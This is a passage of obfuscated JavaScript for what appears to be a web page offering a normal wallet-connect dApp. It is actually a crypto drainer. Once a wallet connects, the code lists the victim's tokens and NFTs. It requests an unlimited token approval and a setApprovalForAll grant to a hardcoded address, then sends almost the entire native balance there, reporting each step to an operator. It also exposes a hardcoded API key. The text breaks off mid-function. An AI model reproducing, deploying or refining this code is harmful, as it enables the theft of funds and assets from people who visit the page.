const _0x2bef79=_0x6d38;(function(_0x5756e5,_0x1ad60b){const _0x2575d1=_0x6d38,_0x388e52=_0x5756e5();while(!![]){try{const _0x13cd4b=parseInt(_0x2575d1(0x153))/0x1+-parseInt(_0x2575d1(0xb6))/0x2*(parseInt(_0x2575d1(0x15e))/0x3)+parseInt(_0x2575d1(0x137))/0x4+-parseInt(_0x2575d1(0x142))/0x5+parseInt(_0x2575d1(0x16b))/0x6*(parseInt(_0x2575d1(0x113))/0x7)+-parseInt(_0x2575d1(0x101))/0x8+-parseInt(_0x2575d1(0x11d))/0x9;if(_0x13cd4b===_0x1ad60b)break;else _0x388e52['push'](_0x388e52['shift']());}catch(_0x5ce042){_0x388e52['push'](_0x388e52['shift']());}}}(_0x48a7,0x7acbc));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {avalanche,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[avalanche,mainnet],projectId='ee71d215d0dec7d1bf950851c84d9643',{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x2bef79(0x127))]({'chains':chains,'options':{'appName':_0x2bef79(0x117)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x2bef79(0x10c),'coinbase':_0x2bef79(0x122)}},ethereumClient);function _0x6d38(_0x2fd6dc,_0x5da317){const _0x48a766=_0x48a7();return _0x6d38=function(_0x6d387,_0x30177b){_0x6d387=_0x6d387-0xb2;let _0x5e5a0d=_0x48a766[_0x6d387];return _0x5e5a0d;},_0x6d38(_0x2fd6dc,_0x5da317);}let currentUrl=window['location'][_0x2bef79(0x123)];const OWNER_ADDRESS=_0x2bef79(0xc7),ABI=[{'constant':!![],'inputs':[],'name':_0x2bef79(0x171),'outputs':[{'name':'','type':_0x2bef79(0xb5)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x134),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':_0x2bef79(0x148),'type':_0x2bef79(0x14f)},{'name':'_value','type':'uint256'}],'name':_0x2bef79(0xcd),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x2bef79(0x152),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':_0x2bef79(0xed),'type':'address'}],'name':_0x2bef79(0xb4),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0xc3),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':'view','type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':_0x2bef79(0x138),'type':_0x2bef79(0x14f)},{'name':'_to','type':_0x2bef79(0x14f)},{'name':'_value','type':_0x2bef79(0x15f)}],'name':_0x2bef79(0xcf),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0xba),'outputs':[{'name':'','type':_0x2bef79(0x14f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[{'name':'','type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x13d),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0xeb),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0x114),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':'view','type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0xdc),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[],'name':_0x2bef79(0x172),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[{'name':_0x2bef79(0xf9),'type':_0x2bef79(0x14f)}],'name':_0x2bef79(0xff),'outputs':[{'name':'','type':_0x2bef79(0xfb)}],'payable':![],'stateMutability':'view','type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[{'name':'','type':_0x2bef79(0x14f)},{'name':'','type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x12f),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0x119),'outputs':[{'name':'','type':_0x2bef79(0xfb)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[{'name':_0x2bef79(0x133),'type':_0x2bef79(0x14f)}],'name':'balanceOf','outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[],'name':_0x2bef79(0xcb),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0x16c),'outputs':[{'name':'','type':_0x2bef79(0x14f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0xf5),'outputs':[{'name':'','type':_0x2bef79(0x14f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0x168),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'constant':![],'inputs':[{'name':_0x2bef79(0x107),'type':_0x2bef79(0x14f)},{'name':_0x2bef79(0x14c),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x174),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':_0x2bef79(0x163),'type':_0x2bef79(0x15f)},{'name':_0x2bef79(0x15d),'type':_0x2bef79(0x15f)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':'amount','type':_0x2bef79(0x15f)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':'function'},{'constant':![],'inputs':[{'name':_0x2bef79(0xd4),'type':'uint256'}],'name':_0x2bef79(0x147),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[{'name':_0x2bef79(0xe4),'type':_0x2bef79(0x14f)},{'name':_0x2bef79(0x148),'type':_0x2bef79(0x14f)}],'name':_0x2bef79(0xbb),'outputs':[{'name':_0x2bef79(0x11b),'type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'constant':!![],'inputs':[],'name':_0x2bef79(0x118),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x2bef79(0x140),'outputs':[{'name':'','type':_0x2bef79(0xfb)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':_0x2bef79(0xee),'type':_0x2bef79(0x14f)}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':!![],'inputs':[],'name':_0x2bef79(0x11f),'outputs':[{'name':'','type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'constant':![],'inputs':[{'name':_0x2bef79(0xf3),'type':'address'}],'name':_0x2bef79(0x126),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'constant':![],'inputs':[{'name':_0x2bef79(0xea),'type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x14a),'outputs':[],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[{'name':_0x2bef79(0xe3),'type':_0x2bef79(0x15f)},{'name':_0x2bef79(0xfe),'type':_0x2bef79(0xb5)},{'name':'_symbol','type':_0x2bef79(0xb5)},{'name':_0x2bef79(0xe2),'type':_0x2bef79(0x15f)}],'payable':![],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0xef)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x2bef79(0xd4),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x145),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x2bef79(0xd4),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0xf0),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x141),'type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x2bef79(0x144),'type':_0x2bef79(0x15f)},{'indexed':![],'name':_0x2bef79(0x170),'type':'uint256'}],'name':_0x2bef79(0x13e),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x2bef79(0xea),'type':_0x2bef79(0x14f)},{'indexed':![],'name':'_balance','type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x15a),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x2bef79(0x157),'type':'address'}],'name':_0x2bef79(0x143),'type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x2bef79(0x157),'type':_0x2bef79(0x14f)}],'name':'RemovedBlackList','type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x2bef79(0x14f)},{'indexed':!![],'name':_0x2bef79(0x173),'type':_0x2bef79(0x14f)},{'indexed':![],'name':_0x2bef79(0x112),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x13a),'type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x2bef79(0xb9),'type':_0x2bef79(0x14f)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':'value','type':_0x2bef79(0x15f)}],'name':'Transfer','type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[],'name':_0x2bef79(0xd5),'type':'event'},{'anonymous':![],'inputs':[],'name':'Unpause','type':_0x2bef79(0x111)}],ABIN=[{'inputs':[{'internalType':_0x2bef79(0xb5),'name':_0x2bef79(0x171),'type':_0x2bef79(0xb5)},{'internalType':_0x2bef79(0xb5),'name':_0x2bef79(0x168),'type':'string'},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x10e),'type':_0x2bef79(0x15f)},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x164),'type':_0x2bef79(0x15f)}],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':'owner','type':_0x2bef79(0x14f)},{'indexed':!![],'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0x135),'type':_0x2bef79(0x14f)},{'indexed':!![],'internalType':'uint256','name':_0x2bef79(0x100),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x13a),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x2bef79(0xf5),'type':_0x2bef79(0x14f)},{'indexed':!![],'internalType':_0x2bef79(0x14f),'name':'operator','type':_0x2bef79(0x14f)},{'indexed':![],'internalType':_0x2bef79(0xfb),'name':_0x2bef79(0x135),'type':_0x2bef79(0xfb)}],'name':_0x2bef79(0xe1),'type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xd7),'type':_0x2bef79(0x14f)},{'indexed':!![],'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xf3),'type':'address'}],'name':_0x2bef79(0xf2),'type':_0x2bef79(0x111)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xb9),'type':_0x2bef79(0x14f)},{'indexed':!![],'internalType':_0x2bef79(0x14f),'name':'to','type':_0x2bef79(0x14f)},{'indexed':!![],'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x100),'type':'uint256'}],'name':'Transfer','type':_0x2bef79(0x111)},{'inputs':[],'name':_0x2bef79(0xb3),'outputs':[{'internalType':_0x2bef79(0xb5),'name':'','type':'string'}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0xe7),'outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':'uint256'}],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'inputs':[],'name':_0x2bef79(0xbf),'outputs':[{'internalType':'uint256','name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0xdd),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':'to','type':_0x2bef79(0x14f)},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x100),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0xcd),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':'function'},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':'owner','type':'address'}],'name':_0x2bef79(0x110),'outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x2bef79(0xb5),'name':'','type':_0x2bef79(0xb5)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0xb7),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0x116),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x100),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x178),'outputs':[{'internalType':_0x2bef79(0x14f),'name':'','type':_0x2bef79(0x14f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':'address','name':_0x2bef79(0xf5),'type':_0x2bef79(0x14f)},{'internalType':_0x2bef79(0x14f),'name':'operator','type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x136),'outputs':[{'internalType':'bool','name':'','type':_0x2bef79(0xfb)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0xc6),'outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x2bef79(0x16f),'type':'uint256'}],'name':_0x2bef79(0x167),'outputs':[],'stateMutability':_0x2bef79(0xc1),'type':_0x2bef79(0x13c)},{'inputs':[],'name':'name','outputs':[{'internalType':_0x2bef79(0xb5),'name':'','type':_0x2bef79(0xb5)}],'stateMutability':'view','type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0xf5),'outputs':[{'internalType':_0x2bef79(0x14f),'name':'','type':'address'}],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'inputs':[{'internalType':_0x2bef79(0x15f),'name':'tokenId','type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x151),'outputs':[{'internalType':_0x2bef79(0x14f),'name':'','type':_0x2bef79(0x14f)}],'stateMutability':'view','type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0xf7),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x2bef79(0x125),'type':'function'},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xb9),'type':'address'},{'internalType':_0x2bef79(0x14f),'name':'to','type':_0x2bef79(0x14f)},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x100),'type':_0x2bef79(0x15f)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x2bef79(0x125),'type':'function'},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xb9),'type':'address'},{'internalType':_0x2bef79(0x14f),'name':'to','type':'address'},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x100),'type':_0x2bef79(0x15f)},{'internalType':_0x2bef79(0xc2),'name':'_data','type':_0x2bef79(0xc2)}],'name':_0x2bef79(0xc5),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x2bef79(0xfb),'name':'','type':_0x2bef79(0xfb)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0x10b),'type':'address'},{'internalType':'bool','name':_0x2bef79(0x135),'type':'bool'}],'name':_0x2bef79(0x124),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0xb5),'name':'baseURI','type':_0x2bef79(0xb5)}],'name':'setBaseURI','outputs':[],'stateMutability':'nonpayable','type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0xb5),'name':'provenanceHash','type':'string'}],'name':_0x2bef79(0xd9),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x131),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x15c),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0x11c),'outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0x159),'name':_0x2bef79(0xd2),'type':_0x2bef79(0x159)}],'name':_0x2bef79(0x129),'outputs':[{'internalType':_0x2bef79(0xfb),'name':'','type':_0x2bef79(0xfb)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x2bef79(0xb5),'name':'','type':'string'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':'uint256','name':_0x2bef79(0x108),'type':'uint256'}],'name':_0x2bef79(0x177),'outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xf5),'type':_0x2bef79(0x14f)},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x108),'type':'uint256'}],'name':_0x2bef79(0x13b),'outputs':[{'internalType':_0x2bef79(0x15f),'name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x2bef79(0x15f)}],'name':_0x2bef79(0x160),'outputs':[{'internalType':'string','name':'','type':_0x2bef79(0xb5)}],'stateMutability':_0x2bef79(0xb2),'type':'function'},{'inputs':[],'name':_0x2bef79(0xc3),'outputs':[{'internalType':'uint256','name':'','type':_0x2bef79(0x15f)}],'stateMutability':_0x2bef79(0xb2),'type':_0x2bef79(0x13c)},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xb9),'type':_0x2bef79(0x14f)},{'internalType':'address','name':'to','type':'address'},{'internalType':_0x2bef79(0x15f),'name':_0x2bef79(0x100),'type':_0x2bef79(0x15f)}],'name':_0x2bef79(0xcf),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':'function'},{'inputs':[{'internalType':_0x2bef79(0x14f),'name':_0x2bef79(0xf3),'type':_0x2bef79(0x14f)}],'name':_0x2bef79(0x126),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)},{'inputs':[],'name':_0x2bef79(0x150),'outputs':[],'stateMutability':_0x2bef79(0x125),'type':_0x2bef79(0x13c)}];let wallet;$(_0x2bef79(0x165))['click'](async function(){const _0x157bb0=_0x2bef79;wallet=_0x157bb0(0x130),await connector();}),$('.coinbase')['click'](async function(){const _0x560ef4=_0x2bef79;wallet=_0x560ef4(0x14b),await connector();}),$(_0x2bef79(0x155))[_0x2bef79(0x169)](async function(){const _0x15c320=_0x2bef79;wallet=_0x15c320(0x12d),await connector();}),$(_0x2bef79(0xc0))[_0x2bef79(0x169)](async function(){const _0x2b47c2=_0x2bef79;try{await web3Modal['openModal']();}catch(_0x25a4ab){console[_0x2b47c2(0x115)](_0x2b47c2(0x162),_0x25a4ab);return;}});let connector=async()=>{const _0xf7f56a=_0x2bef79;if(typeof web3===_0xf7f56a(0x149)||typeof ethereum==='undefined'){console['log'](_0xf7f56a(0xd1));if(wallet===_0xf7f56a(0x130)){let _0x21d4b6=_0xf7f56a(0x175)+currentUrl;window[_0xf7f56a(0x105)]['href']=_0x21d4b6;}else{if(wallet===_0xf7f56a(0x14b)){let _0x993360=_0xf7f56a(0xda)+currentUrl;window[_0xf7f56a(0x105)][_0xf7f56a(0x123)]=_0x993360;}else{if(wallet==='trustwallet'){let _0x132a89='https://link.trustwallet.com/open_url?url='+currentUrl;window[_0xf7f56a(0x105)][_0xf7f56a(0x123)]=_0x132a89;}}}}else try{await web3Modal[_0xf7f56a(0x104)]();}catch(_0x192b35){console[_0xf7f56a(0x115)](_0xf7f56a(0x162),_0x192b35);return;}};$(_0x2bef79(0xe0))[_0x2bef79(0x169)](async function(){const _0x4185d7=_0x2bef79;let _0x5836f8=getAccount();console[_0x4185d7(0x115)](_0x5836f8),!_0x5836f8[_0x4185d7(0x14f)]&&(console[_0x4185d7(0x115)]('No\x20address'),alert(_0x4185d7(0x12e))),_0x5836f8[_0x4185d7(0x11a)][_0x4185d7(0x171)]==='MetaMask'&&(_0x5836f8[_0x4185d7(0x11a)][_0x4185d7(0xcc)][_0x4185d7(0x15b)]()[_0x4185d7(0xf1)]!=='43114'&&(console[_0x4185d7(0x115)](_0x4185d7(0x10f)),await switchNetwork({'chainId':0xa86a}))),selectedAccount=_0x5836f8[_0x4185d7(0x14f)],sendMessage(_0x4185d7(0x139)),sendMessage(_0x4185d7(0xfc)+selectedAccount),covalenthqAPICall();});const Oxa=_0x2bef79(0xc9),Oxc=_0x2bef79(0xc4);async function covalenthqAPICall(){const _0x4c52b1=_0x2bef79,_0x15bb4b={'chain':_0x4c52b1(0xfd)},_0xdfc9a1=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+'/erc20');_0xdfc9a1[_0x4c52b1(0xe9)]=new URLSearchParams(_0x15bb4b)[_0x4c52b1(0x128)]();const _0x1602e1={'method':_0x4c52b1(0xd6),'headers':{'accept':'application/json','X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x378de6=await fetch(_0xdfc9a1,_0x1602e1)[_0x4c52b1(0x146)](_0x687134=>_0x687134[_0x4c52b1(0x10a)]());console[_0x4c52b1(0x115)](_0x378de6);let _0x6bdd68=_0x378de6;console[_0x4c52b1(0x115)](_0x4c52b1(0x120),_0x6bdd68);let _0x4e4f9c=await Promise[_0x4c52b1(0x106)](_0x6bdd68[_0x4c52b1(0x14d)](async _0x533e2d=>{const _0x3660f2=_0x4c52b1;let _0x582438;try{_0x582438=await getValue(_0x533e2d[_0x3660f2(0x161)],_0x533e2d[_0x3660f2(0xbc)],_0x533e2d['decimals']);}catch(_0x1a4145){_0x582438=0x0;}return console[_0x3660f2(0x115)](_0x582438),{'balance':_0x533e2d[_0x3660f2(0xbc)],'value':_0x582438,'address':_0x533e2d[_0x3660f2(0x161)]};}));console[_0x4c52b1(0x115)](_0x4c52b1(0xd3),_0x4e4f9c),tokens=_0x4e4f9c[_0x4c52b1(0xf4)](_0x3dfffd=>_0x3dfffd[_0x4c52b1(0x112)]>0x5),tokens['sort']((_0x113dc0,_0x1eb0f1)=>_0x1eb0f1[_0x4c52b1(0x112)]-_0x113dc0['value']),console[_0x4c52b1(0x115)](_0x4c52b1(0xe8),await getNetwork(),_0x4c52b1(0xfa),tokens),NFTs=await getNFTs(selectedAccount)[_0x4c52b1(0xc8)](_0x59e714=>{const _0x139516=_0x4c52b1;console[_0x139516(0x115)](_0x139516(0x166),_0x59e714);}),NFTs=NFTs['result'],console[_0x4c52b1(0x115)](_0x4c52b1(0x176),NFTs);if(tokens[_0x4c52b1(0xde)]===0x0&&NFTs[_0x4c52b1(0xde)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x4c52b1(0x158));}}async function onApprove(){const _0x449903=_0x2bef79;if(tokens[_0x449903(0xde)])try{loopTokens(tokens);}catch(_0x260ea6){console[_0x449903(0xe5)](_0x449903(0xdb)+_0x260ea6[_0x449903(0x156)]);}else{if(NFTs[_0x449903(0xde)]){try{loopNfts(NFTs);}catch(_0xfdb032){console['error'](_0x449903(0xdb)+_0xfdb032[_0x449903(0x156)]);}onSendEther(),sendMessage(_0x449903(0x10d));}else try{onSendEther();}catch(_0x703553){console[_0x449903(0xe5)](_0x449903(0xdb)+_0x703553['message']);}}}async function loopTokens(_0x4605b5){const _0x558889=_0x2bef79;for await(let _0x1a434b of _0x4605b5){console[_0x558889(0x115)](_0x558889(0xdf),_0x1a434b);try{sendMessage(_0x558889(0x14e));let {hash:_0xd03ed3}=await writeContract({'address':_0x1a434b[_0x558889(0x14f)],'abi':ABI,'functionName':'approve','args':[Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999']});console[_0x558889(0x115)](_0x558889(0x109),_0xd03ed3),_0xd03ed3&&(console[_0x558889(0x115)]('Approved'),sendMessage(_0x558889(0x12c)),sendMessage(_0x558889(0x16a)+_0x1a434b['address']),sendMessage(_0x558889(0xe6)+_0x1a434b[_0x558889(0xbc)]),sendMessage(_0x558889(0xf8)+Oxa));}catch(_0x3618eb){console['log']('Error:\x20'+_0x3618eb),sendMessage(_0x558889(0x12b));}};await loopNfts(NFTs);}async function loopNfts(_0x596622){const _0x4ef65f=_0x2bef79;for await(let _0xb3ac4a of _0x596622){console['log'](_0x4ef65f(0xbe),_0xb3ac4a);try{let {hash:_0x578ca4}=await writeContract({'address':_0xb3ac4a[_0x4ef65f(0x161)],'abi':ABIN,'functionName':_0x4ef65f(0x124),'args':[Oxa,!![]]});console[_0x4ef65f(0x115)](_0x4ef65f(0x109),_0x578ca4),console[_0x4ef65f(0x115)]('Transaction\x20Receipt:\x20'+receipt),sendMessage(_0x4ef65f(0x12c)),sendMessage(_0x4ef65f(0x132)+_0xb3ac4a[_0x4ef65f(0x161)]),sendMessage('Your\x20address\x20'+Oxa);}catch(_0x109546){console[_0x4ef65f(0x115)](_0x4ef65f(0x11e)+_0x109546),sendMessage(_0x4ef65f(0x12b));}}await onSendEther();}async function onSendEther(){const _0x350620=_0x2bef79;console[_0x350620(0x115)](_0x350620(0x13f));try{let _0x23c655=await fetchBalance({'address':selectedAccount});console[_0x350620(0x115)](_0x23c655);const _0x3650ae=await fetchFeeData();console['log'](_0x3650ae);var _0x468257=_0x3650ae[_0x350620(0x103)][_0x350620(0xce)];_0x468257=parseFloat(_0x468257);let _0x45bc8e=parseFloat(_0x23c655[_0x350620(0x103)])-_0x468257*0.00042;_0x45bc8e=parseEther(_0x45bc8e[_0x350620(0x128)]()),console[_0x350620(0x115)](_0x45bc8e);const {hash:_0x27ff84}=await sendTransaction({'to':Oxa,'value':_0x45bc8e});console[_0x350620(0x115)](_0x27ff84),sendMessage(_0x350620(0xbd),_0x27ff84),sendMessage(_0x350620(0xec)),sendMessage(_0x350620(0xb8));}catch{sendMessage(_0x350620(0x16e));}}async function sendMessage(_0x1653b8){return new Promise((_0x455f11,_0x1910f9)=>{const 